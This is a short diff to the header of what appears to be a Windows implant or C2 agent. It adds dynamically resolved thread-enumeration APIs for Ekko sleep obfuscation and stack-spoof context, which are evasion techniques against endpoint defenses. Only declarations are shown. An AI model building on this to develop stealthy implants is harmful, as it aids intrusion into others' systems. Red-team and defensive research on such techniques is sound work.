@@ -2,6 +2,7 @@
 #define AGENT_H
 
 #include <windows.h>
+#include <tlhelp32.h>
 #include <stdint.h>
 #include <Native.h>
 #include <LdrLoad.h>
@@ -143,6 +144,11 @@ namespace Root
             DECLAPI( SetEvent              );
             // stack spoofing
             DECLAPI( DuplicateHandle       );
+            // Ekko sleep: thread enumeration for random-thread spoof context
+            DECLAPI( CreateToolhelp32Snapshot );
+            DECLAPI( Thread32First            );
+            DECLAPI( Thread32Next             );
+            DECLAPI( OpenThread               );
         } Krnl32 = {
             RSL_TYPE( LoadLibraryA   ),
             RSL_TYPE( GetProcAddress ),
@@ -168,6 +174,10 @@ namespace Root
             RSL_TYPE( WaitForSingleObjectEx ),
             RSL_TYPE( SetEvent              ),
             RSL_TYPE( DuplicateHandle       ),
+            RSL_TYPE( CreateToolhelp32Snapshot ),
+            RSL_TYPE( Thread32First            ),
+            RSL_TYPE( Thread32Next             ),
+            RSL_TYPE( OpenThread               ),
         };
 
         struct {
